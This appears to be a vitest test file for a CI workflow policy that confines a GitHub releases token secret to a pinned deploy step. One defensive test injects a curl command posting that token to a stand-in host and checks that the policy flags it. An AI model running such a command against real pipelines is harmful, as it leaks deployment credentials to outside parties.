/**
 * The read-only GitHub releases key (owner 2026-11-19): the deploy uploads it as
 * the run Worker secret GITHUB_RELEASES_TOKEN, and the workflow policy admits
 * secrets.RUN_GITHUB_RELEASES_TOKEN only in the exact reviewed deploy step.
 */
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import { releasesSecrets } from '../src/deploy/releasesKey.ts';
import { checkWorkflow } from '../src/workflow/policy.ts';
import { releasesKeyDeployStep } from '../src/workflow/releasesKeyCredential.ts';
import { REPO_ROOT } from './scratch.ts';

const CI = readFileSync(join(REPO_ROOT, '.github/workflows/ci.yml'), 'utf8');
const KEY_LINE = 'RUN_GITHUB_RELEASES_TOKEN: ${{ secrets.RUN_GITHUB_RELEASES_TOKEN }}';
const rules = (source: string): string[] => [...new Set(checkWorkflow('ci.yml', source).map(f => f.rule))];
function mutate(source: string, from: string, to: string): string {
  expect(source.includes(from), `test fixture: '${from}' not found`).toBe(true);
  return source.replace(from, to);
}

describe('the secrets file', () => {
  it('carries only the Worker secret name, and nothing without a key', () => {
    expect(JSON.parse(releasesSecrets('github_pat_11AAAAAAAA0123456789abcdef') ?? '')).toEqual({ GITHUB_RELEASES_TOKEN: 'github_pat_11AAAAAAAA0123456789abcdef' });
    expect(releasesSecrets(undefined)).toBeNull();
    expect(releasesSecrets('')).toBeNull();
  });
  it('refuses a malformed key without echoing it', () => {
    for (const bad of ['short', 'github_pat_with space inside 0123456789', 'ghp_"quoted"0123456789abcdef']) {
      expect(() => releasesSecrets(bad)).toThrow('RUN_GITHUB_RELEASES_TOKEN is not a GitHub token');
      try { releasesSecrets(bad); } catch (error) { expect(String(error)).not.toContain(bad); }
    }
  });
});

describe('the workflow', () => {
  it('uploads the key with both Worker deploys, through the pinned step', () => {
    for (const environment of ['staging', 'production']) {
      const step = releasesKeyDeployStep(environment);
      for (const line of step) expect(CI).toContain(line);
    }
    expect(CI.split(KEY_LINE).length - 1).toBe(2);
    expect(checkWorkflow('ci.yml', CI)).toEqual([]);
  });
  it('refuses the key in any other step or job', () => {
    const smoke = '        run: node tools/gates/src/smoke/cli.ts --env staging\n';
    expect(rules(mutate(CI, smoke, `${smoke.replace('        run:', '        env:\n          ' + KEY_LINE + '\n        run:')}`))).toContain('secret-outside-deploy');
    expect(rules(mutate(CI, '      - name: Typecheck\n', `      - name: Typecheck\n        env:\n          ${KEY_LINE}\n`))).toContain('secret-outside-deploy');
  });
  it('refuses any change to the step that carries the key', () => {
    const extra = 'rm -f "$RUNNER_TEMP/run-worker-keys.json"\n';
    expect(rules(mutate(CI, extra, `${extra}          curl -d "$RUN_GITHUB_RELEASES_TOKEN" https://example.invalid\n`))).toContain('secret-outside-deploy');
    expect(rules(mutate(CI, '--env staging --assets deploy-site "$@"', '--env staging --assets deploy-site "$@" --var X:1'))).toContain('secret-outside-deploy');
    expect(rules(mutate(CI, '      - name: Deploy the attested artifact to staging\n', '      - name: Deploy the attested artifact to production\n'))).toContain('secret-outside-deploy');
  });
});
